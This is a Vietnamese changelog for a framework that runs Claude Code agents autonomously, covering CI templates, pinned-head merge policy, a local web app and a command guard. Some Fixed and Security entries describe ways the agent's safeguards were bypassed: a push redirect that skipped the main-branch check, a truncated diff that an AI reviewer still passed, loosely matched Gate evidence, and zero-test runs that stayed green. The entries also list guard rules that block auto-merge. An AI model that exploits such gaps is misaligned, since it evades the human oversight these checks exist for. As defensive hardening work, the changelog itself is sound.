- E2E trình duyệt cho app (T-1992, D-133, `PRF-WEB-006`): `tests_e2e/` (ngoài `tests/` — bộ test chính vẫn không cần trình duyệt) chạy 7 màn × 2 viewport (1280×800, 390×844): không lỗi console/API, không cuộn ngang, bàn phím (link bỏ qua là điểm Tab đầu), axe-core 4.14.0 0 vi phạm critical/serious ở cả sáng lẫn tối, luồng ghi `BLUEPRINT.md`. Phụ thuộc chỉ ở job CI mới `app-e2e` (`requirements-e2e.txt` ghim hash: Playwright 1.64.0 Apache-2.0 và bắc cầu; `--only-shell chromium`), vào `quality.needs`; `dep-audit` quét thêm file này. axe-core vendored nguyên văn ở `tests_e2e/vendor/axe/` kèm `LICENSE` (MPL-2.0), `SOURCE` (URL, sha256) — `vendor-check --strict` xanh, không phát tán sang dự án đích. App sửa 3 lỗi E2E tìm ra: focus lần tải đầu, vùng cuộn `pre` không focus được, favicon 404. `BLUEPRINT.md` repo khung: mục "Ứng dụng cục bộ" với `PRF-WEB-*` (D-134).
- `xt.py plan waves [--plan P] [--max N] [--json]` (T-1901, ADR-0038): xếp task mở của PLAN thành đợt chạy song song — đợt k nhận task mà mọi `sau:` đã đóng hoặc thuộc đợt < k, trong đợt `files:` đôi một không giao (`_path_overlap`), ≤ N task (mặc định 5), task thiếu `files:` đứng riêng; task trên chu trình, ghi chú `sau:`/`files:` hỏng, đã defer hoặc chờ task bị chặn → `blocked` kèm lý do. Hàm thuần `plan_waves` dùng chung cho autopilot và màn Kế hoạch của app; không cần vòng đang chạy. `docs/specs/SPEC-app.md`: hợp đồng API của app (T-1911). Dự án đích: chưa phải làm gì (lệnh có sau khi nâng bản).
- `docs/ops/CI-TIMING-2026-10-21.md`: số đo 20 run CI xanh của repo khung (wall trung vị 94,5 s, P90 151 s; 14 job; chờ runner ≤ 4 s) so với phương án gom 3 job (~200 s ước lượng từ `gate-par` cục bộ) — giữ fan-out theo tiêu chí nhận của kế hoạch tối ưu (D-131), điều kiện xem lại ghi trong file.
- Audit khung + bộ mẫu tại `ec4c7d2` (`docs/ops/AUDIT-REPORT-2026-10-21.md`, kế hoạch tối ưu `docs/ops/OPTIMIZATION-PLAN-2026-10-21.md`, bằng chứng `docs/ops/evidence/audit-2026-10-21.json`), xác minh lại độc lập (tái hiện + hai lượt bác bỏ mỗi phát hiện): AUD-CODE-014 nâng 🔴, AUD-XFEAT-013 nâng 🟠, AUD-SEC-102 có bằng chứng đo được, mới AUD-XFEAT-020 (sàn M/L không chạy ở CI) và AUD-CI-016 (reviewer CI nhận diff bị cắt). Kế hoạch sửa [`PLAN-3.15-audit-gate.md`](docs/autopilot/PLAN-3.15-audit-gate.md) (D-130); PLAN-3.14-app tạm dừng tới khi Lát 1–3 merge.
- `dev-task.sh gate-par`: cùng lệnh với `gate` nhưng nhóm độc lập chạy song song (typecheck ∥ lint ∥ build → test → test_floor), log tách nhóm, đỏ khi nhóm nào đỏ (exit code nhóm đỏ đầu tiên), guard hỏi một lần cho mọi lệnh (D-128, test `DevTaskGateParTest`).
- [ADR-0038](docs/adr/0038-local-app-on-xt.md) (D-126; chủ repo hỏi 2026-10-21 "biến dự án này thành app và phân chia công
  việc"): ứng dụng web cục bộ `xt.py app` — `http.server` stdlib trên 127.0.0.1, HTML/CSS/JS thuần không build, API JSON gọi
  đúng hàm của CLI, app không chạy lệnh; chia việc bằng máy `xt.py plan waves`. Kế hoạch
  [`PLAN-3.14-app.md`](docs/autopilot/PLAN-3.14-app.md): 11 lát, 29 task, 12 đợt song song theo `sau:`/`files:`. Chưa có
  mã — dự án đích chưa phải làm gì.

### Fixed
- `same_command` (bằng chứng Gate: `loop record` tick, `loop status`/`verify` so evidence với Gate, khử trùng lặp ở `loop verify`/`blueprint-status --run`) so **dạng chuẩn** `canonical_command`: chỉ dãy space/tab ngoài nháy là tự do; nháy, khoảng trắng cạnh toán tử, heredoc, NBSP, gán biến có nháy đều có nghĩa. Token identity cũ (T-1502, bốn vòng vá ở review #167) vẫn coi `test -n $X` ≡ `test -n "$X"` (X rỗng: exit 0 ≠ 1) nên evidence của lệnh xanh giả được tick cho Gate khác và `loop verify --all` bỏ Gate đỏ đứng sau Gate "cùng lệnh" xanh (AUD-CODE-014 🔴 — audit 2026-10-21 tại `ec4c7d2`, `docs/ops/AUDIT-REPORT-2026-10-21.md`). Chỉ chặt hơn: evidence lệch nháy/khoảng trắng cạnh toán tử nay là `verify` (chạy lại đúng Gate). `autonomy-bench` thêm 5 ca; `shell_identity` bỏ.
- `dev-task.sh`: lệnh test (`test`, `test_fast`, `test_floor`, `test_unit` của `test-shard`) exit 0 mà stdout/stderr có dòng tổng kết `Ran 0 tests` → exit 5, cùng chữ ký và mã với `zero_tests_red` của `xt.py` — cổng commit (`gate-fast`), `gate`, `gate-par`, shard và CI mẫu không còn xanh khi unittest Python ≤ 3.11 không chạy test nào (`-k` sai), trong khi `loop record` đã đỏ (AUD-XFEAT-013 🟠, audit 2026-10-21; test `DevTaskZeroTestsTest`). Không bắt `go test` "[no tests to run]" (hợp lệ ở gói không khớp `-run`).
- Sàn Gate M/L (`LOOP-HARNESS-023`) chạy ở CI mẫu: lệnh mới `xt.py floor [--run] [--skip KEY] [--strict] [--json]` (cùng `gate_floor_commands` và `run_gate_shell` với `loop verify`, bỏ lệnh trùng `gate`); job `gate` của `framework/templates/ci.yml` chạy `floor --run --skip e2e` sau `gate-par` — khoá sàn khai riêng (`format_check`, `coverage`) đỏ thì CI đỏ (trước: chỉ `loop verify` chạy, CI và `doctor` xanh — AUD-XFEAT-020 🟠). Khoá sàn thiếu chỉ cảnh báo (như `doctor`).
- `install.py --with-github` vào thư mục con của repo git (monorepo `apps/web`) → từ chối trước khi ghi gì (exit 2), in gốc repo và cách làm — GitHub chỉ chạy workflow ở `.github/workflows` của gốc, trước đây CI mẫu được ghi vào thư mục con và không bao giờ chạy (AUD-CI-012). Không phải repo git → như cũ.
- `install.py` không ghi xuyên symlink: `.xtemplates/` là symlink → từ chối; `VERSION`, `README.md`, `scripts/*`, `framework/`, `research/` trong `.xtemplates/` là symlink → gỡ liên kết rồi ghi bản khung tại chỗ (file nó trỏ tới không bị đụng); `.gitignore` là symlink → bỏ qua có log (AUD-CFG-003).

### Security
- Guard: `git push` có chuyển hướng (`git push origin 2>&1`, `>/dev/null`, `&>log`) trên nhánh chính nay `PUSH_MAIN` như không chuyển hướng — token chuyển hướng từng bị đọc là refspec nên bỏ kiểm nhánh hiện tại (mã `NONE`, AUD-SEC-102 🟠; thay T-1814). shlex trả `>` cho cả `'>'` trong nháy (tên ref hợp lệ), nên guard xét cả hai cách đọc và lấy quyết định chặt hơn (`_stricter`): `git push origin '>' main` vẫn thấy `main`. `gh pr merge N … 2>&1` vẫn chặn oan "PR không rõ" (an toàn — chưa sửa). 3 ca `autonomy-bench`.
- `pr-review.yml`: diff vượt 400.000 byte hoặc REST không trả được diff → không gọi reviewer, ghi `pr reviewed --inconclusive` (trước: `head -c` cắt diff rồi reviewer vẫn trả `clean` cho cả head — phần cắt không được rà; AUD-CI-016 🟠). Chỉ có hiệu lực khi bật reviewer (pha `harden`).

## [3.13.0] - 2026-10-21

**Dự án đích: chạy lại `install.py --with-github`** — máy chỉ merge ghim head, không dùng auto-merge của GitHub; required check `merge-gate` bỏ ([ADR-0036](docs/adr/0036-pinned-merge-no-auto-merge-drop-merge-gate.md), D-122). Nhận `xt.py` mới và **stub** `merge-gate.yml` (`pull_request`, luôn xanh — chỉ giữ context cho ruleset còn đòi); rồi gỡ `merge-gate` khỏi ruleset sống (hoặc import lại `ruleset-main.json` 2 check `quality` · `gitleaks`), tắt Settings → "Allow auto-merge", đặt `XT_STEWARD_TOKEN` để merge của steward kích CI trên nhánh chính. Không cần event policy cho `pull_request_target` (K-1 đóng). Stub bị xoá ở bản sau — đừng xoá tay trước khi gỡ ruleset (PR treo "Expected"). Mẫu `xt.yaml`/`ci.yml` chỉ đổi chú thích nhưng hash đổi: dự án đã sửa hai file này nhận `.xtemplates-new` một lần, không cần gộp gì.

### Removed
- Required check `merge-gate` (ADR-0023) và lệnh `xt.py merge-gate` (kể cả `--event`/`--check-run` chưa phát hành): không còn auto-merge thì không còn gì để chặn — `.github/rulesets/main.json` còn 4 check (`quality`, `protection-guard`, `gitleaks`, `dep-audit`), `framework/templates/ruleset-main.json` còn 2. `merge-gate.yml` là stub chuyển tiếp (xem đầu mục). ADR-0035 (`workflow_run` + check-run) không triển khai. Test `MergeGateTest`/`MergeGateEventTest` gỡ.
- `pr next`: hành động `enable-auto-merge` và khoá `fallback` (JSON máy đọc); nhánh `base_has_required` (D-062 hết đối tượng). Steward không bật auto-merge; `pr-steward.yml` `workflow_run` chỉ còn `workflows: [CI]`.

### Added
- `dep-audit.yml`: bước `zizmor --offline --persona regular --min-severity high .github/workflows` (research CL-5) — lint bảo mật workflow, 0 phát hiện high; phụ thuộc audit mới `zizmor==1.31.1` (MIT, 11 hash wheel, chỉ chạy trên runner CI).
- `xt.py pr stats [--days N] [--repo R] [--json]` (research TD-4): chỉ REST — lead time mở → merge (trung vị, P95), số run CI `pull_request` mỗi PR, tỉ lệ `failure`/`cancelled`, PR làn chuẩn, PR revert; `/handover` dán bảng 7 ngày vào `PROGRESS.md`.
- `xt.py loop triage-local` (research TD-5): đọc JSON hook `PostToolUseFailure` từ stdin, lệnh Bash cổng/Gate đỏ → ≤ 20 dòng lỗi đã che bí mật, phân loại như `ci-triage`, luôn exit 0; file `.claude/hooks/post-tool-failure.sh`. **Hook chưa đăng ký** trong `.claude/settings.json` (cần người — T-1822 hoãn), nên phiên và dự án đích chưa chạy nó.
- [ADR-0037](docs/adr/0037-reviewers-only-in-harden.md) (chủ repo 2026-10-21, D-124): reviewer/reviewer-alt chỉ chạy ở pha `harden`; chỉ chuyển sang `harden` khi lên production. Pha `build` hoãn review thành nợ cho mọi PR máy được merge — kể cả ngoại lệ cứng đã miễn (`hard_waived`) và nhãn `risk:` (trước: vẫn đòi review sạch); ngoại lệ cứng giữ người vẫn do người merge, review `blocking` đã có vẫn chặn; nợ trả trước phát hành (`release-check` hàng `phase`/`review_debt`). `/autopilot` bước 6 không giao reviewer ở pha build. **Dự án đích** (áp dụng như repo khung — chủ repo 2026-10-21): nhận qua `install.py`; giữ `delivery_phase: build` tới khi lên production, PR `hard_waived`/`risk:` nay merge khi CI xanh; mẫu `xt.yaml` đổi chú thích. `orchestration-and-subagents.md` và `stop-points-and-escalation.md` đổi chữ theo ADR-0037.
- `xt.py pr title-check [TITLE]` (research NH-2): cùng regex và trần 72 ký tự với job `checks` của CI (hằng `PR_TITLE_RE`/`PR_TITLE_MAX` dùng chung, test so chuỗi với `ci.yml`); không TITLE → đọc tiêu đề PR của nhánh qua REST; `pr_title_check: off` → bỏ qua (D-123). `/autopilot` bước 6 gọi trước khi mở PR, diff ngoại lệ cứng được `reviewer-alt` rà trước khi mở, PR ≤ 150 dòng.
- Khoá `xt.yaml` `test_floor` + bước `test_floor` của `dev-task.sh gate` (chạy bộ test với `python3.11` khi có, vắng → bỏ qua có log) — đóng khe CI `py311` đỏ mà cổng cục bộ xanh. Repo khung khai `test_floor`.
- `tests/test_guard_fuzz.py` (research CL-2): fuzz tất định (seed 1811, `XT_FUZZ_ROUNDS`) 10 bộ bọc lệnh trên mọi ca guard của `autonomy-bench`, ba bất biến (deny đơn điệu, không ngoại lệ, allow giữ) — 2455 biến thể, 0 ca đỏ thật.
- Phụ thuộc dev: `shellcheck-py==0.11.0.1` ghim hash (MIT; binary shellcheck GPL-3.0 chỉ chạy dev/CI) — shellcheck cục bộ = CI (runner 0.9.0 → 0.11.0); `docs/ops/DEPENDENCIES.md`.
- [ADR-0036](docs/adr/0036-pinned-merge-no-auto-merge-drop-merge-gate.md): mọi đường merge của máy (phiên `pr next`, steward `--apply`) là merge ghim head (`--match-head-commit` / REST `sha=` / MCP `expectedHeadSha`) sau khi `merge-check` = `merge` ở đúng head; CI chưa xong → `wait` (`merge-watch`, steward theo `workflow_run` CI + lịch); auto-merge do người bật → `merge` ghim head nếu đủ điều kiện, không thì `disable-auto-merge`. Guard chặn phẳng bật auto-merge (`gh pr merge --auto` mọi vị trí cờ, GraphQL `enablePullRequestAutoMerge`, MCP `enable_pr_auto_merge`) ở mọi mức, mọi chính sách — mã `AUTO_MERGE_ENABLE`; ca fixture adversarial-author mới. Bảng ADR bị ảnh hưởng (0014…0035) ở ADR-0036.
- Guard: endpoint GraphQL ở dạng `/graphql` hay URL đầy đủ (`gh api /graphql -f query='mutation{mergePullRequest…}'`) nay đi cùng nhánh "merge không xác minh được" như `gh api graphql` (trước rơi xuống `ask` thường của nhánh REST); lối tắt `disable` của `pre-mcp-guard.sh` không nhận tên tool vừa có `enable` vừa có `disable` (test `McpDisableRegexScopedTest`, `test_guard_gh_api_graphql_endpoint_forms`). Sổ audit: AUD-HAR-065 hết đối tượng (`_base_has_required` xoá); AUD-DOC-055/HAR-087/CI-013 phần `merge-gate` hết đối tượng.
- `research/2026-10-21-next-level-speed-automation-quality.md`: nghiên cứu nâng khung lên tầng mới (code nhanh hơn, tự động tối đa, chất lượng tối đa) — số đo thật (cổng cục bộ, CI, lead time PR, push/PR), dữ kiện sống Claude Code 2.1.306 · GitHub · công cụ Python · thực hành agent (2026-10-21), đề xuất theo ba trục kèm bằng chứng/đường lùi, dự thảo thứ tự PLAN-3.13. Việc khẩn K-1: GitHub chặn mặc định `pull_request_target` ở repo public từ 2026-11-02 — `merge-gate.yml` (required check) của repo khung và dự án đích cần event policy hoặc chuyển sang `workflow_run` + check-run.

### Changed
- Mẫu `framework/templates/ci.yml` còn 3 job (ADR-0039): `gate` (chạy `gate-par`, rồi `require lint test`, `doctor`, `ci-check`, tiêu đề PR) · `e2e` (matrix 1 shard, thêm shard khi đo e2e là đường dài nhất) · `quality` (gom, bước protection-guard); bỏ job riêng build/typecheck/lint/test shard/coverage/checks/protection-guard; `gate` và `e2e` chạy cùng lúc; mọi checkout `persist-credentials: false`. Đổi chữ (giữ ID/mức): `WF-CI-024`, `WF-CI-025`. Lý do đo được: X-Company ~17 job làm `e2e` chờ runner 6 phút dù không `needs`.
- CI repo khung: Python mặc định 3.14 (3.13 chỉ còn vá bảo mật) cho build/typecheck/lint/test/coverage/checks, `py311` giữ làm sàn; `COVERAGE_CORE=sysmon` ở shard `test` và `coverage` (cục bộ 3.14.6 vẫn 100 % dòng + nhánh; chưa đo tốc độ trên CI — đỏ thì bỏ biến, ghi D-NNN). `requirements-dev.txt` đủ wheel cp314.
- Đổi chữ (giữ ID/mức): `LOOP-CI-011` (link run CI sống ≤ 90 ngày, số chụp vào `docs/ops/`); `harness-files.md` mẫu `test_fast` Go/Java/.NET; `supply-chain.md`/`licensing-and-ip.md` + mẫu `secret-scan.yml`: `gitleaks-action` theo EULA độc quyền, tài khoản tổ chức cần `GITLEAKS_LICENSE` (giữ action, D-123); `/review` chỉ diff + SPEC, phát hiện phải tái hiện được.
- Đổi chữ (giữ ID/mức) theo ADR-0036: `LOOP-STOP-002`, `LOOP-STOP-005`, `LOOP-STOP-009`, `LOOP-STOP-022` (viết lại cả mục theo một cơ chế), `LOOP-STOP-026`, `LOOP-STOP-029`, `WF-CI-001`, `WF-REVIEW-007`, `QA-STATIC-014`, `WF-GIT-002`, `FE-BUILD-010`, `PRF-MONO-006`, bảng BASE-GATE (`quality-gates.md`) — L3 = máy merge ghim head mọi làn (nhanh khi CI xanh, chuẩn khi CI xanh + review sạch ở head), ruleset dự án đích 2 check. Dòng trạng thái ADR-0014/0015/0016/0020/0021/0022/0023/0024/0025/0027/0028/0034/0035. `/autopilot` bước 6 bỏ "tắt auto-merge trước khi push". Runbook steward theo merge ghim head.
- Khớp harness với Claude Code 2.1.306 (research TD-8): `harness-files.md` §Giới hạn — hook `TaskCompleted` chỉ chạy khi phiên có tool Task (model 5.5/Fable ở CLI cần `CLAUDE_CODE_ENABLE_TODO_TOOLS=1`); `LOOP-CI-010` (đổi chữ, giữ ID/mức) và lệnh headless mẫu ở `self-healing-ci.md`/`loop-design.md` thêm `--permission-mode` và `--settings .claude/settings.json` (`-p` khởi đầu `default`, `--bare` sắp mặc định); `LOOP-CTX-014` đổi `MAX_THINKING_TOKENS` → `effort` ở frontmatter subagent (`=0` không tắt được thinking trên model 5.5/Fable; đổi effort giữa phiên mất prompt cache); `pr-review.yml` ghim `claude-code-action` v1.0.256. ADR-0023 ghi ngày hiệu lực 2025-12-08 của thay đổi `pull_request_target` (GitHub công bố 2025-11-07).

## [3.12.0] - 2026-10-21

**Dự án đích: chạy lại `install.py --with-github`** — CI, E2E và ruleset tối thiểu khi triển khai ban đầu, chạy song song tối đa ([ADR-0034](docs/adr/0034-target-ci-ruleset-minimal-max-parallel.md), D-115, D-116, D-117). File `.github/` đã sửa nhận bản mới ở `*.xtemplates-new` để gộp tay; import lại `.github/rulesets/main.json` (3 required check, không "up to date"). **`e2e` đổi nghĩa:** CI nay chạy khoá `e2e` của `xt.yaml` (trước: chỉ agent chạy tay) — runner thiếu trình duyệt/server thì khai `e2e_setup`, chưa sẵn thì để `e2e: ""`.

### Added
- Mục checklist mới: `WF-CI-025` (SHOULD — CI mẫu tối thiểu, song song tối đa: không job lập kế hoạch tuần tự, matrix tĩnh, `e2e` không chờ `build`), `QA-E2E-029` (SHOULD — E2E khởi đầu tối thiểu: `@smoke` + axe, chia shard bằng `$XT_SHARD`, phần tối ưu thêm khi vượt ngân sách). Bảng "Khởi đầu tối thiểu, song song tối đa" ở `framework/10-workflow/ci-cd-pipeline.md`. Mẫu `framework/templates/ruleset-main.json` cho dự án đích (repo khung giữ ruleset riêng).
- `dev-task.sh` task mới: `test-mode` (`shard`/`whole`), `e2e-mode` (`off`/`shard`/`whole`), `e2e [I N]` (`e2e_setup` rồi `e2e` với `XT_SHARD=I/N`, mặc định `1/1`; lệnh không dùng `$XT_SHARD` → chỉ shard 1 chạy cả suite; qua guard — LOOP-STOP-027). Khoá mới của mẫu `xt.yaml`: `e2e_setup`. Test `DevTaskCiModeTest`.

### Changed
- Mẫu `framework/templates/ci.yml`: bỏ job `test-plan` (và `env.TEST_SHARDS`) — `test` là matrix tĩnh `[1, 2, 3, 4]`, mỗi shard đọc `dev-task.sh test-mode` (`whole` → shard 1 chạy cả `test`, shard khác thoát sau checkout); `coverage` `needs: [test]`; job mới `e2e` (matrix `[1, 2]`, không `needs`); `protection-guard` vào `quality.needs`. Không có mẫu CD (D-117).
- Ruleset mẫu dự án đích (D-116, D-117): required check còn 3 (`quality`, `gitleaks`, `merge-gate`) — `protection-guard` và `dep-audit` thành job con trong `quality.needs`; `strict_required_status_checks_policy: false` (PR merge song song). `install.py` lấy ruleset từ `framework/templates/ruleset-main.json`. Đổi chữ mục: `BASE-GATE-007` (MUST, mức giữ nguyên — đạt bằng strict, hoặc không strict kèm CI chạy lại trên push nhánh mặc định), `WF-CI-001` và `WF-GIT-002` (3 required check), `QA-STATIC-014`, `FE-BUILD-010`, `PRF-MONO-006` (danh sách check), `LOOP-HARNESS-008`, `BASE-GATE-001` (dev-task chạy thêm `e2e`).

## [3.11.1] - 2026-10-20

**Dự án đích: chạy lại `install.py`** — ba hồi quy lộ ra khi nâng hotel-manager/X-Company lên 3.11.0: manifest ghi hash dạng `sha256:<hex>` (gitleaks `generic-api-key` hết bắt nhầm dòng `secret-scan.yml`), `guard.py` không còn ký tự U+FFFD thật, `xt.py` tự phân trang `gh api` (FB-001).

### Fixed
- `install.py` ghi mọi hash trong `.xtemplates/manifest.json` (và `harness.sha256.json`) dạng `sha256:<hex>`; mọi chỗ đọc (`install.py` phân loại/`--plan`, `xt.py doctor --drift`) nhận cả hex trần của manifest cũ — gitleaks rule `generic-api-key` từng bắt dòng `".github/workflows/secret-scan.yml": "<64 hex>"` ở hai dự án đích (test `test_manifest_labels_every_hash_sha256`, `test_manifest_legacy_bare_hex_still_pristine`, `test_doctor_drift_manifest_sha256_and_legacy_hex`).
- `xt.py _gh_api(path, paginate=True)` (merge-check, pr next, merge-watch, release-check, `latest_framework_tag`) tự phân trang bằng `page=N` trên đường `repos/<chủ>/<repo>/…`, không dùng `gh api --paginate` — `--paginate` đi theo header Link tới `repositories/{id}/…` mà proxy của phiên Claude Code chặn (403) nên PR > 30 check/commit/tệp làm `merge-check` hỏng (FB-001 của X-Company; test `GhApiPaginationTest`).
- `.claude/hooks/guard.py` `clean_text` ghi `"U+FFFD"` dạng escape thay ký tự U+FFFD thật — test "mọi file văn bản UTF-8, không BOM, không U+FFFD" của dự án đích (hotel-manager) từng đỏ sau khi cài 3.11.0; repo khung thêm test cùng luật cho mọi file tracked (`tests/test_docs_budget.py`).
- `loop record` tự tick PLAN (D-113) ghi xuyên symlink `PLAN.md` (`resolve()` trước khi đọc/ghi) — trước đó thay symlink bằng file thường (review #191, T-1737).

## [3.11.0] - 2026-10-20

**Dự án đích: chạy lại `install.py`** (PLAN-3.12-lean: tài liệu vận hành một nhà, harness ít lượt hơn, `install.py` cập nhật file gốc tại chỗ khi chưa sửa và in các bước "Dự án đích" từ bản đã cài; mẫu `xt.yaml` 3 KB — khoá mới nối vào `xt.yaml` của dự án dạng chú thích).

### Added
- `xt.py license-check` (`BASE-DEP-005`, AUD-DEP-004/AUD-HAR-079): chỉ thư viện chuẩn — đọc license gói đã cài (`importlib.metadata`: `License-Expression` > `License` ngắn > classifier đổi sang SPDX) của mọi gói ghim `==` trong `requirements-dev.txt` (`--requirements` lặp được), đối chiếu allowlist `license-allow.json` (SPDX cho phép + ngoại lệ có `approved_by`/`expires`, chỉ khớp đúng license đã duyệt: pathspec, certifi — MPL-2.0); `OR` cần một nhánh được, `AND`/có ngoặc cần mọi định danh được; vi phạm, gói ghim không marker mà chưa cài, ngoại lệ quá hạn → exit 1; allowlist/requirements hỏng → exit 2. Thêm vào `lint` của `xt.yaml` (~0,4 s; job CI `lint` đã cài `requirements-dev.txt`). `BLUEPRINT.md`: `BASE-DEP-005`, `BASE-DOC-004` tick kèm `— Kiểm:`. Test `tests/test_license_check.py`. Dự án đích: không bắt buộc (lệnh có trong `xt.py` mới; cần `license-allow.json` riêng).
- Runbook `pr-steward` [`docs/ops/RUNBOOK-PR-STEWARD.md`](docs/ops/RUNBOOK-PR-STEWARD.md) (`BASE-DOC-004`, AUD-HAR-072): steward làm gì/khi nào chạy, triệu chứng (PR treo, auto-merge không bật, thiếu `XT_STEWARD_TOKEN`) chẩn đoán bằng `pr next`/`pr steward`, tắt khẩn và khôi phục. Bảng license mọi gói kể cả bắc cầu của `requirements-dev.txt` và `requirements-audit.txt` ở [`docs/ops/DEPENDENCIES.md`](docs/ops/DEPENDENCIES.md) (`BASE-DEP-005`, AUD-DEP-004), xác minh 2026-10-20.
- CI fan-out/fan-in cho dự án đích (`WF-CI-024`, `WF-CI-001`): mẫu không phụ thuộc stack `framework/templates/ci.yml` — job song song `build` · `typecheck` · `lint` (mỗi job gọi `.xtemplates/scripts/dev-task.sh <task>`, lệnh lấy từ `xt.yaml`), `test-plan` + `test` (matrix `TEST_SHARDS` shard qua `dev-task.sh test-shard` khi `xt.yaml` khai đủ `test_list`/`test_unit`/`test_combine`, không thì một job chạy `dev-task.sh test`), `coverage` (gộp bằng `test-combine`; không chia shard thì bỏ qua theo bước, không theo job), `checks` (bước đầu `dev-task.sh require lint test` — D-096: ĐỎ ở mọi `delivery_phase` khi `lint` hoặc `test` của `xt.yaml` rỗng/no-op theo `is_noop`, kèm `::error::` nêu khoá cần điền và ví dụ Node/Python/Go, vì job `lint`/`test` gặp khoá rỗng chỉ in "skip" và xanh — "CI xanh rỗng"; `typecheck`/`build` rỗng vẫn được; `xt.py doctor`, `xt.py ci-check`, tiêu đề PR theo Conventional Commits — miễn `pr_title_check: off`/bot/`Revert`), `quality` TỔNG HỢP `needs` mọi job con `if: always()` đỏ khi kết quả ≠ `success`, `protection-guard` (đối chiếu ruleset ↔ job, như repo khung; không có ruleset → cảnh báo); action ghim SHA, `contents: read`, timeout mỗi job, concurrency theo PR. Mẫu `framework/templates/secret-scan.yml` (job `gitleaks`). `dev-task.sh setup`: chạy khoá mới `setup` của `xt.yaml` (cài phụ thuộc/toolchain, vd `npm ci`) — chỉ lệnh khai báo, vắng/rỗng → bỏ qua exit 0, qua guard (cấm → 126). `dev-task.sh require T…`: exit 1 khi task phân giải ra rỗng/no-op (tự dò được thì tính là có lệnh). Test `tests/test_ci_template.py`. **Dự án đích: chạy lại `install.py --with-github`** — CI mẫu ĐỎ tới khi khai `lint:` và `test:` thật trong `xt.yaml` (D-096; mẫu `xt.yaml` để rỗng); `quality` không còn phải tự viết (dự án đã có `ci.yml`/`secret-scan.yml` riêng: giữ nguyên, bản khung ở `*.xtemplates-new` để gộp tay); thêm `setup:` vào `xt.yaml` nếu job CI cần cài phụ thuộc; còn `dep-audit` (theo ngôn ngữ) là required check phải tự viết job hoặc bỏ khỏi ruleset.
- Cổng commit nhanh `commit_gate: fast|full` trong `xt.yaml` (vắng = `full` = hành vi cũ; giá trị lạ → `doctor`/`ci-check` từ chối): hook `pre-bash-guard.sh` chạy `dev-task.sh gate-fast` khi `fast` — `format_check` · lint · typecheck · `test_fast` với `XT_CHANGED_FILES` (file đổi so với HEAD + file mới), không build, không ngưỡng coverage; `test_fast` trống/no-op hoặc không biết file đổi → `test`. `dev-task.sh gate` giữ nguyên là cổng đầy đủ (CI `quality`, chạy một lần trước khi đẩy/mở PR); `--no-verify` vẫn không bỏ được cổng nào. `xt.py test-select [FILE…] [--tests DIR] [--unittest]` chọn test liên quan (chính file test, `test_<tên>.py`, test nhắc tên file, test quét theo đuôi; không ánh xạ được → cả suite). Repo khung và mẫu `framework/templates/xt.yaml` đặt `commit_gate: fast`; `/autopilot` Pha 2 bước 10: commit nhanh → cổng đầy đủ một lần → đẩy một lần, mở PR → `pr next` (reviewer chỉ khi máy đòi — ADR-0033); không đẩy thêm sau review. Dự án đích: chạy lại `install.py`; đặt `commit_gate` (và `test_fast` nếu stack có lệnh test liên quan) trong `xt.yaml`. `test-select` chọn thêm test theo `import <module>` (không chỉ theo tên file); diff đụng `xt.yaml`, `ruff.toml`, `pyproject.toml`, `.coveragerc`, `requirements*.txt`, `scripts/dev-task.sh`, hook cổng hoặc `settings.json` thì commit chạy mọi lớp test không coverage (D-112, xem mục Changed; trước đó: cổng đầy đủ) — commit không tự hạ cổng của chính nó.
- Pha giao hàng `delivery_phase: build|harden` trong `xt.yaml` ([ADR-0031](docs/adr/0031-delivery-phase-build-harden.md); PD-02/PD-04 rút gọn): vắng/rỗng = `harden` (hành vi cũ); mẫu `framework/templates/xt.yaml` đặt `build`, repo khung khai `harden`; `doctor` (lỗi `xt-yaml`) và `ci-check` từ chối giá trị lạ. Pha có hiệu lực khi cả nhánh đích đã commit lẫn cây làm việc đều `build`. Pha build: PR làn chuẩn KHÔNG thuộc ngoại lệ cứng merge khi CI xanh + không xung đột + không có review `blocking` (ở head, hoặc ở head cũ mà chưa có review sạch sau nó — push không "rửa" lỗi chặn) + không mang nhãn `risk:` — `merge_eligibility` trả `review: deferred`, `merge-check --json` có `review_deferred: true` (cùng `delivery_phase`), `merge-gate`/guard/steward theo cùng kết quả, `pr next` ghi "pha build: bỏ qua review, ghi nợ (ADR-0031)"; ngoại lệ cứng (kể cả đã miễn người bằng `merge_hard_exceptions: auto`) vẫn cần review sạch; guard không đổi. Nợ review trả ở G7: `release-check` thêm hàng BLOCKER `phase` (FAIL khi `build`/giá trị lạ) và `review_debt` (FAIL khi file ngoài tài liệu đổi sau SHA quét của sổ audit mà chưa được phủ — theo nhóm audit của file, file không thuộc nhóm nào so với SHA quét mới nhất). `LOOP-STOP-022` (mức không đổi) trỏ ADR-0031. Corpus `autonomy-bench` thêm 12 ca `pr-phase-*`/`review-phase-*` (tổng 291, `AUTONOMY-BASELINE.md` cập nhật). **Dự án đích:** chạy lại `install.py` (nhận `xt.py`, skill `/autopilot`), rồi đặt `delivery_phase` trong `xt.yaml` (copy-if-absent — dự án cũ tự thêm `delivery_phase: build` nếu muốn merge nhanh; trước G7 đặt `harden`).

### Changed
- Harness ít lượt hơn, nhanh hơn (PLAN-3.12 Lát 2): hook `Stop`/`PreCompact` thoát sớm khi chưa `loop init` (không có `.autopilot/state.json` — 260 ms → 7 ms mỗi lần, T-1711); `dev-task.sh format-file` không gọi `xt.py guard-check` cho mẫu formatter dựng sẵn của khung (prettier/ruff/black/gofmt/rustfmt — hằng trong script), chỉ lệnh `format_file` khai báo mới qua guard (−260–370 ms mỗi Edit/Write; T-1712, test `test_format_file_builtin_template_skips_guard`); cổng commit khi diff đụng cấu hình cổng (xt.yaml, xt.py, dev-task.sh, hook, ruff/coverage/requirements): hook vẫn chạy `gate-fast` nhưng đặt `XT_GATE_ALL_TESTS=1` → bước test = MỌI lớp test qua `test_list`/`test_unit` song song, không ngưỡng coverage (≈75 s thay 131 s; D-112 — vẫn không phụ thuộc `test-select` nên commit không tự hạ cổng của chính nó, review #177), dự án chưa khai hai khoá đó → `test` đầy đủ như trước; coverage 100 % giữ ở cổng trước PR và CI. Mẫu `framework/templates/xt.yaml` 9,1 KB → 3,1 KB (mỗi khoá một dòng chú thích; nhà của bộ khoá, sàn M/L và mẫu theo stack chuyển về `harness-files.md` §Khoá của `xt.yaml` — T-1731). `xt.py checks` gộp `progress-check` · `changelog-check` · `ci-check` · `license-check` · `settings`/`ruleset` JSON thành một tiến trình (lint của repo khung gọi một lệnh thay 5 — T-1714). `doctor --drift` đọc nhãn `.xtemplates/VERSION` dạng `3.10.0 (sha)` (trước: báo lệch sai vì so cả SHA — T-1718). `merge-watch` thoát (PR còn mở) in sẵn kết quả `pr next`; `loop record` exit 0 với lệnh khớp Gate tự tick `[x]` trong PLAN 